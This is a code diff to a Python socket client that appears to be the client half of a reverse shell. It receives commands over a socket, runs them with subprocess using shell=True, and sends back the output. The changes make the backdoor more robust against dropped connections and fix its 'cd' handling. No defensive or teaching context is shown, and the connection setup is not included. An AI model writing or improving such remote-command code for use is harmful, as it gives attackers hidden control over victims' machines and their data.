@@ -22,10 +22,18 @@ class Client():
         json_data = ""
         while True:
             try:
-                json_data += self.sock.recv(1024).decode()
+                chunk = self.sock.recv(1024)
+
+                if not chunk:
+                    return None
+                
+                json_data += chunk.decode()
                 return json.loads(json_data)
+            
             except ValueError:
                 continue
+            except (ConnectionResetError, TypeError):
+                return None
 
     def _exec_command(self, command):
 
@@ -33,10 +41,9 @@ class Client():
 
             if command[:2] == "cd":
                 try:
-                    print(command[3:])
                     os.chdir(command[3:])
                 except OSError:
-                    return f"Location {command[2:]} does not exits!"
+                    return f"Location {command[3:]} does not exits!"
             else:
                 process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE, universal_newlines=True)
                 result = process.stdout.read() + process.stderr.read()
